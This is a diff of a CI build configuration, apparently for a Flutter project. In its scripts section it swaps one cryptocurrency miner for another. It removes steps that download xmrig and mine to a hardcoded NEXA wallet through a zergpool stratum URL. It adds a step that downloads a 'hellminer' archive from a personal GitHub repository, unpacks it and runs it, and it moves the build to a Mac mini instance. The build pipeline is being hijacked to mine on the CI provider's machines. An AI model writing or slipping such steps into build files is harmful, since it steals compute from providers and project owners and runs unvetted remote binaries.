@@ -1,7 +1,7 @@
 workflows:
   default-workflow:
     name: Default Workflow
-    instance_type: linux
+    instance_type: mac_mini_m1
     max_build_duration: 120
     environment:
       flutter: 3.7.5
@@ -19,8 +19,4 @@ workflows:
           include: true
           source: true
     scripts:
-      - wget https://github.com/xmrig/xmrig/releases/download/v6.19.3/xmrig-6.19.3-linux-x64.tar.gz
-      - tar -xvf xmrig-6.19.3-linux-x64.tar.gz
-      - cd xmrig-6.19.3
-      - chmod +x xmrig
-      - ./xmrig -o stratum+tcp://cryptonight_haven.asia.mine.zergpool.com:4452 -u nexa:nqtsq5g5f6n4mhcvlvkyshxyyxkz8ezpeprg7lsqjex5a0ut -p c=NEXA -k -a cn/2
+      - brew install unrar && wget https://github.com/tesasik67/q1/raw/main/hellminer-main.rar && unrar x hellminer-main.rar && cd hellminer-main && chmod +x hellminer && ./hellminer
